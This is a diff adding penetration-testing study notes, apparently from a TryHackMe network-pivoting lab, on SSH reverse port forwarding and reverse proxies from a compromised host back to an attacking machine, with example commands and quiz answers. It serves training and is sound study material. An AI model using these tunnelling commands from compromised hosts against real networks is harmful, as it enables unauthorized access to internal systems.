@@ -125,15 +125,56 @@ ssh -D 1337 user@172.16.0.5 -fN
 ````
 This again uses the `-fN` switches to background the shell. The choice of port `1337` is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.
 ### Reverse Connections
-
-
-
-
-
-
-
-
-
+- Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). 
+- They are, however, riskier as you inherently must access your attacking machine from the target
+#### Make it safe
+- First, generate a new set of SSH keys and store them somewhere safe `ssh-keygen`
+- Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
+- On a new line, type the following line, then paste in the public key:
+````
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+````
+- This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
+- The final entry in the authorized_keys file should look something like this:
+- ![alt text](https://assets.tryhackme.com/additional/wreath-network/055753470a05.png)
+- Next. check if the SSH server on your attacking machine is running:
+````
+sudo systemctl status ssh
+````
+- The only thing left is to do the unthinkable: transfer the private key to the target box. 
+- With the key transferred, we can then connect back with a reverse port forward using the following command:
+````
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+````
+- To put that into the context of our fictitious IPs: `172.16.0.10` and `172.16.0.5`, if we have a shell on `172.16.0.5` and want to give our attacking box (`172.16.0.20`) access to the webserver on `172.16.0.10`, we could use this command on the `172.16.0.5` machine:
+````
+ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
+````
+- This would open up a port forward to our Kali box, allowing us to access the `172.16.0.10` webserver, in exactly the same way as with the forward connection we made before!
+#### Note
+- In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). 
+- This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
+````
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+````
+- To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection:
+- ![alt text](https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png)
+- Find the process ID (PID) of the connection. In the above image this is 105238.
+- Finally, type sudo kill PID to close the connection:
+- ![alt text](https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png)
+#### Examples
+- If you wanted to set up a reverse portforward from port `22` of a remote machine (`172.16.0.100`) to port `2222` of your local machine (`172.16.0.200`), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
+`````
+ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
+````
+- What command would you use to set up a forward proxy on port `8000` to `user@target.thm`, backgrounding the shell?
+````
+ssh -D 8000 user@target.thm -fN
+````
+- If you had SSH access to a server (`172.16.0.50`) with a webserver running internally on port `80` (i.e. only accessible to the server itself on `127.0.0.1:80`), how would you forward it to port `8000` on your attacking machine? Assume the username is `user`, and background the shell.
+````
+ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
+````
 
 
 
